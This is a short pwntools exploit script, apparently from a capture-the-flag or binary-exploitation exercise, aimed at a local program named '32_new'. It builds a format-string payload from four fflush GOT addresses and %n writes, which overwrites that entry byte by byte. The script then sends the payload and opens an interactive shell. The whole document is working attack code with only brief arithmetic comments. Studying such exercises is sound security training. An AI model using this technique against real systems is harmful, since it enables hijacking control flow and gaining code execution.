from pwn import *

target = process('./32_new')

gdb.attach(target, gdbscript='b *0x080487dc')
print target.recvline()

fflush_adr0 = p32(0x804a028) #first byte --> 0x804a028
fflush_adr1 = p32(0x804a029) #second byte --> 0x804a029
fflush_adr2 = p32(0x804a02a) #third byte --> 0x804a02a
fflush_adr3 = p32(0x804a02b) #fourth byte --> 0x804a02b

#Establish the necessary inputs for our input, so we can write to the addresses
fmt_string0 = "%10$n"
fmt_string1 = "%11$n"
fmt_string2 = "%12$n"
fmt_string3 = "%13$n"

# first byte: 0x10b - 0x56 = 181
# second byte: 0x87 - 0x0b = 124
# third byte: 0x104 - 0x87 = 125
# fourth byte: 0x08 - 0x04 = 4 (chars)
payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fflush_adr3 + "%181x" + fmt_string0 + "%124x" + fmt_string1 + "%125x" + fmt_string2 + "1111" + fmt_string3

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
